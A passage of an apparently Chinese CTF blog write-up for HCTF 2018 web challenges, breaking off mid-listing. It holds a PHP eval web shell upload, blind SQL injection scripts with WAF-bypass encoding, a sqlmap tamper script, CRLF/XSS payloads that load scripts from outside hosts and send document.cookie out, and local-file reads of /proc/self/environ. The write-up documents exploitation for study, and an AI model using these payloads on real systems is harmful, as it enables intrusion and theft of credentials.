class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">@&lt;?php eval($_GET[&apos;cmd&apos;]);</span><br><span class="line">-----------------------------5894518712413--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 09 Nov 2018 06:56:52 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">php/.&lt;br&gt;2&lt;br&gt;&lt;br&gt;@flagggggggggggggg</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>sql盲注</p>
<h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://warmup.2018.hctf.io/index.php?file=hint.php%253f../../../../../ffffllllaaaagggg</span><br><span class="line"></span><br><span class="line">hctf&#123;e8a73a09cfdd1c9a11cca29b2bf9796f&#125;</span><br></pre></td></tr></table></figure>

<h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>模仿扣扣空间的钓鱼网站，扫目录扫到<code>www.zip</code>，得到源码</p>
<p>在<code>member.php</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_COOKIE[&quot;islogin&quot;])) &#123;</span><br><span class="line">    if ($_COOKIE[&quot;login_data&quot;]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);</span><br><span class="line">        $admin_user = $login_data[&apos;admin_user&apos;];</span><br><span class="line">        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);</span><br><span class="line">        if ($udata[&apos;username&apos;] == &apos;&apos;) &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);</span><br><span class="line">        if ($admin_pass == $login_data[&apos;admin_pass&apos;]) &#123;</span><br><span class="line">            $islogin = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>login_data</code>是从<code>cookie</code>中读入然后<code>json_decode</code>得到，而在sql语句中用到了cookie传的值，cookie是可控的，存在注入,可以进行盲注</p>
<p>在<code>safe.php</code>中，有waf对输入的参数过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;;</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>直接绕过</strong></li>
</ul>
<p><code>or</code>被过滤，<code>information_schema</code>不能用，用<code>mysql.innodb_table_stats</code>来查数据库名表名，发现F1444g表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">dic = list(&apos;1234567890abcdefghijklmnopqrstuvwxyz[]&lt;&gt;@!-~?=_()*&#123;&#125;#. /&apos;)</span><br><span class="line">ans = &apos;&apos;</span><br><span class="line">for pos in range(1,1000):</span><br><span class="line">    flag = 1</span><br><span class="line">    for c in dic:</span><br><span class="line">        payload = &quot;admin&apos;and(strcmp(right((select/**/*/**/from/**/F1444g/**/limit/**/0,1),%d),&apos;%s&apos;))||&apos;&quot;%(pos,c+ans)</span><br><span class="line">        cookies = &#123;&apos;islogin&apos;:&apos;1&apos;,&apos;PHPSESSID&apos;:&apos;olvurpb8sqldthvnetdd0elf65&apos;,&apos;login_data&apos;:&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&apos;%payload&#125;</span><br><span class="line">        resp = requests.get(&quot;http://kzone.2018.hctf.io/include/common.php&quot;,cookies=cookies)</span><br><span class="line">        if &apos;Set-Cookie&apos; in resp.headers:</span><br><span class="line">            ans = c+ans</span><br><span class="line">            print(ord(c))</span><br><span class="line">            flag=0</span><br><span class="line">            break</span><br><span class="line">    if flag:</span><br><span class="line">        break</span><br><span class="line">    print(&quot;--&quot;+ans+&quot;--&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用json_decode解unicode绕过</strong></li>
</ul>
<p>waf函数作用在<code>json_decode</code>之前，所以利用unicode字符可以绕过</p>
<p><code>u</code>-&gt;<code>\u0075</code>等</p>
<p>exp1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#!coding:utf-8#</span><br><span class="line"># xishir</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span><br><span class="line"></span><br><span class="line">ss = &quot;&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+&quot;</span><br><span class="line">r = requests.session()</span><br><span class="line">url = &quot;http://kzone.2018.hctf.io/admin/&quot;</span><br><span class="line">#url=&quot;http://127.0.0.1/hctf/www/admin/&quot;</span><br><span class="line"></span><br><span class="line">union = &apos;\u00&apos;+str(hex(ord(&apos;u&apos;)))[2:]+&apos;nion&apos;</span><br><span class="line">sleep = &apos;\u00&apos;+str(hex(ord(&apos;s&apos;)))[2:]+&apos;leep&apos;</span><br><span class="line">ascii = &apos;\u00&apos;+str(hex(ord(&apos;a&apos;)))[2:]+&apos;scii&apos;</span><br><span class="line">ok = &apos;\u00&apos;+str(hex(ord(&apos;=&apos;)))[2:]</span><br><span class="line">substr = &apos;\u00&apos;+str(hex(ord(&apos;s&apos;)))[2:]+&apos;ubstr&apos;</span><br><span class="line">over = &apos;\u00&apos;+str(hex(ord(&apos;#&apos;)))[2:]</span><br><span class="line">blank = &quot;/**/&quot;</span><br><span class="line">orr = &apos;\u00&apos;+str(hex(ord(&apos;o&apos;)))[2:]+&apos;r&apos;</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    print i</span><br><span class="line">    for j in ss:</span><br><span class="line">        payload = &quot;admin&apos; and (substr((select binary F1a9 from F1444g limit 1),&quot;+str(i)+&quot;,1)=&apos;&quot;+str(j)+&quot;&apos;) and sleep(4) and 1=&apos;1&quot;</span><br><span class="line"></span><br><span class="line">        payload = payload.replace(&apos;sleep&apos;,sleep)</span><br><span class="line">        payload = payload.replace(&apos;union&apos;,union)</span><br><span class="line">        payload = payload.replace(&apos;=&apos;,ok)</span><br><span class="line">        payload = payload.replace(&apos;#&apos;,over)</span><br><span class="line">        payload = payload.replace(&apos; &apos;,blank)</span><br><span class="line">        payload = payload.replace(&apos;ascii&apos;,ascii)</span><br><span class="line">        payload = payload.replace(&apos;substr&apos;,substr)</span><br><span class="line">        payload = payload.replace(&apos;or&apos;,orr)</span><br><span class="line"></span><br><span class="line">        jsons = &apos;&#123;&quot;admin_user&quot;:&quot;&apos;+payload+&apos;&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">        cookie=&#123;&quot;PHPSESSID&quot;:&quot;t0k91etf5fecbi4t25d7hprtm3&quot;,</span><br><span class="line">        &quot;islogin&quot;:&quot;1&quot;,</span><br><span class="line">        &quot;login_data&quot;:jsons&#125;</span><br><span class="line"></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r1 = r.get(&quot;http://kzone.2018.hctf.io&quot;,cookies=cookie)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        #print t2</span><br><span class="line">        if (t2-t1)&gt;4:</span><br><span class="line">            #print &quot;aaaaaaaa&quot;</span><br><span class="line">            flag+=str(j)</span><br><span class="line">            print i,flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>exp2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">def enc(ss):</span><br><span class="line">    tmp = &apos;&apos;</span><br><span class="line">    for s in ss:</span><br><span class="line">        tmp += &apos;\u00&apos;+s.encode(&quot;hex&quot;)</span><br><span class="line">    return tmp</span><br><span class="line">url = &quot;http://kzone.2018.hctf.io/admin/index.php&quot;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    &quot;islogin&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;login_data&quot;:&apos;&#123;&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:true&#125;&apos;</span><br><span class="line">&#125;</span><br><span class="line">ss = string.letters + string.digits + &quot;&#123;&#125;&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">    for s in ss:</span><br><span class="line">        #payload = &quot;admin&apos; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&apos;%s&apos;),sleep(5),1)#&quot; % (i,s)</span><br><span class="line">        #payload = &quot;admin&apos; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&apos;F1444g&apos;),%d,1)=&apos;%s&apos;),sleep(5),1)#&quot; % (i,s)</span><br><span class="line">        payload = &quot;admin&apos; and if((substr((select binary F1a9 from F1444g),%d,1)=&apos;%s&apos;),sleep(5),1)#&quot; % (i,s)</span><br><span class="line">        #print payload</span><br><span class="line">        payload = enc(payload)</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            &quot;islogin&quot;:&quot;1&quot;,</span><br><span class="line">            &quot;login_data&quot;:&apos;&#123;&quot;admin_user&quot;:&quot;&apos;+payload+&apos;&quot;,&quot;admin_pass&quot;:true&#125;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        time_start = time.time()</span><br><span class="line">        content = requests.get(url=url,cookies=cookies).content</span><br><span class="line">        time_end = time.time()</span><br><span class="line">        #print time_end - time_start</span><br><span class="line">        if time_end - time_start &gt;= 5:</span><br><span class="line">            flag += s</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sqlmap tamper脚本</strong></li>
</ul>
<p>对payload编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos;</span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;)</span><br><span class="line">    payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;)</span><br><span class="line">    payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;)</span><br><span class="line">    payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;)</span><br><span class="line">    payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;)</span><br><span class="line">    payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;)</span><br><span class="line">    payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;)</span><br><span class="line">    return data % payload</span><br></pre></td></tr></table></figure>

<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://admin.2018.hctf.io/change</span><br><span class="line"></span><br><span class="line">源码里有提示源码</span><br><span class="line"></span><br><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>

<p>这个函数在处理unicode字符时会有问题</p>
<p>转为小写在注册时会调用一次，更改密码时也会调用一次</p>
<p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
<p><code>ᴀ -&gt; A -&gt; a</code></p>
<p>注册用户ᴀdmin</p>
<p>登录用户ᴀdmin，变成Admin</p>
<p>修改密码Admin，更改了admin的密码</p>
<h3 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h3><p>bottle的crlf注入</p>
<p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
<p>跳转地址的端口要小于80</p>
<p>payloads:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E</span><br><span class="line"></span><br><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src%3dhttp://139.199.27.197:7000/1.js%3E%3C/script%3E</span><br><span class="line"></span><br><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/cookie.js%3E%3C/script%3E</span><br><span class="line"></span><br><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=`https://xss.p0desta.com/?a=`%2bdocument.cookie%3C/script%3E</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /user HTTP/1.1</span><br><span class="line">Host: bottle.2018.hctf.io</span><br><span class="line">Content-Length: 265</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://bottle.2018.hctf.io</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://bottle.2018.hctf.io/user</span><br><span class="line">Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6</span><br><span class="line">Cookie: bottle.session=daae51d11ce34a8ca81bd68199c1cccc</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">url=http%3A%2F%2Fbottle.2018.hctf.io%2Fpath%3Fpath%3Dhttp%3A%2F%2Fbottle.2018.hctf.io%3A22%2Fuser%250d%250aX-XSS-Protection%3A0%250d%250aContent-Length%3A300%250d%250a%250d%250a%253Cscript%2520src%3Dhttp%3A%2F%2Ft.cn%2FEAQiR7C%253E%253C%2Fscript%253E&amp;captcha=0m%7DA</span><br></pre></td></tr></table></figure>

<p>让服务器去访问<code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src=http://t.cn/EAQiR7C%3E%3C/script%3E</code></p>
<p>模拟服务器端访问：<br><img src="https://s1.ax1x.com/2018/11/12/iOEHlF.png" alt="iOEHlF.png"></p>
<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><code>/etc/nginx/nginx.conf</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events &#123; worker_connections 1024; &#125; http &#123; include /etc/nginx/mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; &#125; daemon off;</span><br></pre></td></tr></table></figure>

<p><code>/etc/nginx/conf.d/nginx.conf</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p><code>/proc/self/environ</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=82f971e4a9a6SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure>

<p>发现<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure>

<p><code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 